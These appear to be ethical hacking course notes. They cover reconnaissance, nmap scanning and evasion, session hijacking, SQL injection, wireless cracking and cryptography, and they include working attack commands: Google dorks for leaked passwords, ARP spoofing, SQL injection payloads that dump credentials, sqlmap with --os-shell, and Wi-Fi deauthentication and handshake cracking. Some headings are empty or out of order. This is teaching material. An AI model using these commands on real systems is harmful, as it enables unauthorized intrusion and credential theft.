S01

Introduction to Ethical Hacking

Theory

Information Security Overview

Information Security (InfoSec) is the practice of protecting information from unauthorized access, use, disclosure, disruption, modification, or destruction. The goal is to maintain the CIA Triad:

  • Confidentiality: Only authorized people can access data. Achieved via encryption, access controls, authentication.
  • Integrity: Data is accurate and unaltered. Achieved via hashing, digital signatures, checksums.
  • Availability: Systems and data are accessible when needed. Achieved via redundancy, backups, DDoS protection.

Extended model: CIA + AAA = Authentication (who are you?), Authorization (what can you do?), Accounting/Auditing (what did you do?).

Additional properties: Non-repudiation (can't deny actions — digital signatures), Authenticity (data is genuine).

Hacking Concepts

Hacking: Finding and exploiting weaknesses in systems. Types of hackers:

TypeIntentLegal

Hacking Phases (Cyber Kill Chain — attacker's perspective)

  1. Reconnaissance: Gather info about target (passive: OSINT; active: scanning)
  2. Scanning: Identify live hosts, open ports, services, OS
  3. Gaining Access: Exploit vulnerabilities to get in
  4. Maintaining Access: Install backdoors, rootkits, persistence
  5. Clearing Tracks: Delete logs, hide evidence

Ethical Hacking Concepts

An ethical hacker uses the same tools and techniques as attackers but with written authorization to find and fix vulnerabilities before real attackers exploit them. Requires: Scope definition, Rules of engagement, Written permission, NDA, Report findings.

Information Security Controls

  • Administrative: Policies, procedures, training, background checks, incident response plans
  • Technical (Logical): Firewalls, IDS/IPS, encryption, access controls, MFA, SIEM
  • Physical: Locks, CCTV, biometrics, fences, guards, mantraps

Defense in Depth: Multiple layers of security so if one fails, others still protect.

Footprinting & Reconnaissance

TheoryLab

Footprinting Concepts

The first phase of hacking. Collecting as much information as possible about the target before attacking. Passive: No direct contact with target (OSINT, Google, social media). Active: Direct contact (ping, traceroute, social engineering).

What Information to Gather

Organization info (structure, employees, emails, phone numbers), Network info (domains, subdomains, IPs, DNS records, network blocks), System info (OS, web server version, technologies used).

Google Dorking (Advanced Google Hacking)

# Find login pages
site:target.com inurl:login OR inurl:admin OR inurl:portal

# Find exposed files
site:target.com filetype:pdf OR filetype:xls OR filetype:doc
site:target.com filetype:sql OR filetype:bak OR filetype:log

# Find directory listings
site:target.com intitle:"index of" OR intitle:"parent directory"

# Find configuration files
site:target.com ext:xml OR ext:conf OR ext:env OR ext:ini

# Find exposed passwords/credentials
site:target.com intext:"password" filetype:log
site:target.com "db_password" OR "DB_PASSWORD" filetype:env

# Find vulnerable pages
site:target.com inurl:".php?id=" (SQLi candidates)
site:target.com inurl:"/wp-admin" (WordPress admin)

# Find cameras, IoT devices
inurl:"/view/index.shtml" (IP cameras)
intitle:"webcamXP 5" (webcam software)

Nmap — Complete Reference

# ═══ Host Discovery ═══
$ nmap -sn 192.168.1.0/24                 # Ping sweep (no port scan)
$ nmap -sn -PE 192.168.1.0/24             # ICMP echo discovery
$ nmap -sn -PS22,80,443 192.168.1.0/24    # TCP SYN discovery on specific ports
$ nmap -sn -PA80 192.168.1.0/24           # TCP ACK discovery
$ nmap -sn -PU53 192.168.1.0/24           # UDP discovery

# ═══ Port Scanning ═══
$ nmap -sS target.com                     # SYN scan (default, fast, semi-stealth)
$ nmap -sT target.com                     # TCP connect (full handshake)
$ nmap -sU target.com                     # UDP scan (slow)
$ nmap -p 1-1000 target.com               # Specific ports
$ nmap -p- target.com                     # All 65535 ports
$ nmap --top-ports 100 target.com         # Top 100 common ports
$ nmap -F target.com                      # Fast scan (top 100 ports)

# ═══ Service & Version Detection ═══
$ nmap -sV target.com                     # Service/version detection
$ nmap -sV --version-intensity 5 target   # More aggressive probing

# ═══ OS Detection ═══
$ nmap -O target.com                      # OS fingerprinting
$ nmap -A target.com                      # Aggressive: OS + Version + Script + Traceroute

# ═══ NSE Scripts (Nmap Scripting Engine) ═══
$ nmap --script=default target.com        # Default safe scripts
$ nmap --script=vuln target.com           # Vulnerability scanning
$ nmap --script=smb-os-discovery target   # SMB OS info
$ nmap --script=http-title target.com     # Web page titles
$ nmap --script=banner target.com         # Service banners

# ═══ Firewall/IDS Evasion ═══
$ nmap -f target.com                      # Fragment packets (8 bytes)
$ nmap -D RND:5 target.com               # Decoy scan (5 random IPs)
$ nmap -S 192.168.1.100 target.com        # Spoof source IP
$ nmap --source-port 53 target.com        # Use DNS source port
$ nmap -T0 target.com                     # Paranoid timing (very slow)
$ nmap --data-length 25 target.com        # Add random data to packets

# ═══ Output ═══
$ nmap -oN scan.txt target.com            # Normal output
$ nmap -oX scan.xml target.com            # XML output
$ nmap -oG scan.gnmap target.com          # Greppable output
$ nmap -oA scan_all target.com            # All formats

Hping3 — Custom Packet Crafting

$ hping3 -S target.com -p 80 -c 3        # SYN to port 80
$ hping3 -F target.com -p 80              # FIN scan

Botnets

S15

Session Hijacking

TheoryLab

Session Hijacking Concepts

Attacker takes over a valid user session. The user already authenticated — attacker steals the session token/cookie and impersonates them.

Application-Level Hijacking

  • Session Token Prediction: Guess the next session ID (weak randomness)
  • Session Fixation: Force user to use a known session ID
  • XSS-based: Steal cookies via JavaScript injection
  • Session Sniffing: Capture cookies from unencrypted traffic
  • MITM: Intercept traffic and steal/modify session data

Network-Level Hijacking

  • TCP Hijacking: Predict sequence numbers to inject packets into established TCP connection
  • IP Spoofing: Impersonate trusted IP
  • RST Hijacking: Send RST to disconnect one party, take over
# ZAP (Zed Attack Proxy)
# 1. Configure browser proxy → ZAP (127.0.0.1:8080)
# 2. Browse target application
# 3. ZAP captures all requests/responses
# 4. Inspect cookies and session tokens
# 5. Use "Resend" to replay requests with stolen tokens

# Bettercap — MITM + HTTP traffic interception
$ bettercap -iface eth0
» net.probe on                            # Discover hosts
» set arp.spoof.targets 192.168.1.10
» arp.spoof on                            # ARP poison
» set net.sniff.local true
» net.sniff on                            # Sniff traffic

Countermeasures

HTTPS everywhere, Secure cookie flags (HttpOnly, Secure, SameSite), Session timeout, Regenerate session ID after login, Bind session to IP/User-Agent, CSP headers, Token rotation.

Evading IDS, Firewalls & Honeypots

TheoryLab

IDS/IPS/Firewall Concepts

SystemFunctionTypes
FirewallFilter traffic based on rules (IP, port, protocol)Packet Filter, Stateful, Application/Proxy, NGFW
IDSDetect intrusions and ALERT (passive — doesn't block)NIDS (network-based), HIDS (host-based)
IPSDetect and BLOCK intrusions (inline — active)Same as IDS but inline

Detection methods: Signature-based (known patterns), Anomaly-based (deviations from baseline), Heuristic (behavior rules).

IDS Evasion Techniques

  • Fragmentation: Split attack across multiple fragments
  • Encryption: Encrypt traffic (SSL/TLS tunneling)
  • Obfuscation: Encode payload (URL encoding, Unicode, double encoding)
  • Low-and-slow: Attack slowly to stay under rate thresholds
  • Polymorphic shellcode: Changes form each time
  • Decoys: Generate lots of false positives to overwhelm analysts

Honeypots

Decoy systems designed to attract attackers. Purpose: Detect attacks, Study attacker behavior, Divert from real systems. Low-interaction: Simulates services (Honeyd). High-interaction: Full real system (more risk, more intel).

SQLi Step by Step

# Step 1: Test for vulnerability
' OR '1'='1                               # Always true
' OR '1'='1' --                           # Comment out rest
' OR '1'='1' #                            # MySQL comment

# Step 2: Determine number of columns (for UNION)
' ORDER BY 1-- ✓
' ORDER BY 2-- ✓
' ORDER BY 3-- ✓
' ORDER BY 4-- ✗ (error → 3 columns exist)

# Step 3: Find displayable columns
' UNION SELECT 1,2,3--
# See which numbers appear on page (e.g., 2 and 3)

# Step 4: Extract information
' UNION SELECT 1,version(),database()--         # DB version + name
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,username,password FROM users--  # Dump credentials!

# Error-Based (MySQL)
' AND extractvalue(1,concat(0x7e,version()))--

# Boolean-Based Blind
' AND SUBSTRING(database(),1,1)='a'--        # Is first char 'a'?

# Time-Based Blind
' AND IF(1=1,SLEEP(5),0)--                  # 5 second delay = TRUE

SQLMap — Automated SQLi

$ sqlmap -u "http://target.com/page?id=1" --dbs
# --dbs: list databases
$ sqlmap -u "http://target.com/page?id=1" -D webapp --tables
# --tables: list tables in database
$ sqlmap -u "http://target.com/page?id=1" -D webapp -T users --dump
# --dump: extract all data from table
$ sqlmap -u "http://target.com/page?id=1" --os-shell
# --os-shell: get OS command execution (if possible)

Prevention

Parameterized queries / Prepared statements (NEVER concatenate user input into SQL), Input validation, Least privilege DB accounts, WAF, Error handling (don't show SQL errors), ORM usage.

Wireless Hacking Methodology

  1. Discover networks (airodump-ng, NetSurveyor, Wash)
  2. Identify target (SSID, BSSID, Channel, Encryption)
  3. Capture handshake (deauth attack + capture WPA handshake)
  4. Crack key (aircrack-ng + wordlist, or hashcat)
  5. Post-exploitation (MITM, sniffing)
# ═══ Aircrack-ng Suite ═══
# Step 1: Put adapter in Monitor mode
$ sudo airmon-ng start wlan0              # Creates wlan0mon

# Step 2: Scan for networks
$ sudo airodump-ng wlan0mon
# Shows: BSSID, Channel, Encryption, ESSID, connected clients

# Step 3: Target specific network and capture handshake
$ sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Step 4: Force handshake by deauthenticating a client
$ sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# -0 5 = send 5 deauth packets

# Step 5: Crack the captured handshake
$ aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# OR use Hashcat (faster with GPU)
$ hcxpcapngtool capture-01.cap -o hash.hc22000
$ hashcat -m 22000 hash.hc22000 rockyou.txt

# ═══ Finding Hidden SSIDs ═══
$ sudo airodump-ng wlan0mon
# Hidden SSIDs show as <length: 0>
# Wait for a client to connect OR send deauth to force reconnection
# SSID revealed in probe request/response

# ═══ WEP Cracking (much easier) ═══
$ sudo airodump-ng -c 6 --bssid AA:BB:CC -w wep_capture wlan0mon
$ sudo aireplay-ng -3 -b AA:BB:CC wlan0mon   # ARP replay
# Collect ~40,000+ IVs
$ aircrack-ng wep_capture-01.cap

Cryptography

TheoryLab

Cryptography Concepts

TypeHowAlgorithmsUse
SymmetricSame key encrypts and decryptsAES, DES, 3DES, Blowfish, RC4, ChaCha20Bulk data encryption (fast)
AsymmetricKey pair: Public encrypts, Private decryptsRSA, ECC, Diffie-Hellman, ElGamalKey exchange, Digital signatures
HashingOne-way function → fixed-length digestMD5, SHA-1, SHA-256, SHA-512, bcryptIntegrity, Password storage

Key Concepts

  • PKI (Public Key Infrastructure): System for managing digital certificates. Components: CA (Certificate Authority — issues certs), RA (Registration Authority — verifies identities), Certificate Store, CRL/OCSP (revocation checking).
  • Digital Signature: Hash message → encrypt hash with private key → attach to message. Verifier decrypts with public key → compares hashes. Provides: Authentication, Integrity, Non-repudiation.
  • SSL/TLS: Asymmetric for key exchange → Symmetric for data encryption. TLS 1.3 is current standard.
